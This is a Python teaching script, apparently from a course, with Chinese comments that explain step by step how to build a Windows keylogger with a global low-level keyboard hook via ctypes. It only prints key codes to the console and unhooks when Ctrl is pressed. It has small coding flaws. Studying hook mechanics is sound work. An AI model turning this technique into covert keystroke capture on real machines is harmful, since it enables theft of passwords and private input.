#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# @Time     : 2020/11/17 13:52 
# @Author   : wangqiang
# @File     : key_log.py
# @Project  : python_course
# @Python   : 3.7.5
import sys
from ctypes import *
from ctypes.wintypes import MSG

#1.使用windll：使用windll声明user32与kernel类型的变量。使用相应DLL提供的函数时，
#格式为user32.API名称或kernel.API名称。
user32 = windll.user32
kernel32 = windll.kernel32

#2.声明变量：在win32API内部定义并使用的变量值，可以通过MSDN或者网络搜索轻松获取，
#将其声明为变量并事先放入变量
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
CTRL_CODE = 162

#3.定义类：定义拥有挂钩与拆钩功能的类
class KeyLogger:
    def __init__(self):
        self.lUser32 = user32
        self.hooked = None

    #4.定义挂钩函数：使用user32DLL的SetWindowsHookExA函数设置钩子。 要监听的事件为
    #WHKEYBOAD_LL,范围设置为操作系统中运行的所有线程
    def installHookProc(self, pointer):
        self.hooked = self.lUser32.SetWindowsHookExA(
            WH_KEYBOARD_LL,
            pointer,
            kernel32.GetModuleHandleW(None),
            0
        )
        if not self.hooked:
            return False
        return True

    #5.定义拆钩函数：调用user32Dll的SetWindowsHookEx()函数，拆除之前设置的钩子。
    #钩子会大大增加系统负荷，调用完必须拆除
    def uninstallHookProc(self):
        if self.hooked is None:
            return
        self.lUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None

#6.获取函数指针：若想注册钩子过程（回调函数），必须传入函数指针。ctypes为此提供
#了专门的方法。通过CFUNCTYPE（）函数指定SetWindowshookExA()函数所需要的钩子过程
#的参数与参数类。通过CMPFUNC（）函数获取内部声明的函数指针
def getFPTR(fn):
    CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
    return CMPFUNC(fn)

#7.定义钩子过程：钩子过程是一种回调函数，指定事件发生时，调用其执行相应处理。若
#到来的消息类型是WM__KEYDOWN,则将消息值，输出到屏幕；若消息与<CTRL>键的值一致，
#则拆除钩子。处理完毕后，将控制权限让给勾连中的其他钩子过程(CallNextHookEx()函数)
#ps:执行hookedKey = chr(lParam[0])语句时由于lParam[0]是C中long类型，
# python中的int型对于他来说太长了所以我们需要将它转换成对应的ASCLL码值再转换成字符串，
# 改写语句 ：hookedKey = chr(0xFFFFFFFF&lParam[0])
def hookProc(nCode, wParam, lParam):
    if wParam is not WM_KEYDOWN:
        return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)
    hookedKey = chr(0xFFFFFFFF&lParam[0])
    print(hookedKey)

    if(CTRL_CODE == int(lParam[0])):
        print("Ctrl pressed, call uninstallHook()")
        keyLogger.uninstallHookProc()
        sys.exit(-1)
    return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)

#8.传递消息：GetMessageA()函数函数监视队列，消息进入队列后取出消息，并传递给勾连中的
#第一个钩子
def startKeyLog():
        msg = MSG()
        user32.GetMessageA(byref(msg), 0, 0, 0)

#9.启动消息钩取，首先创造KeyLogger 类，然后installHookProc（）函数设置钩子，同时
#注册钩子过程回调函数。最后调用startKeyLog（）函数，将进入队列的消息传递给勾连
keyLogger = KeyLogger()
pointer = getFPTR(hookProc)

if keyLogger.installHookProc(pointer):
       print("installed keyLogger")

startKeyLog()

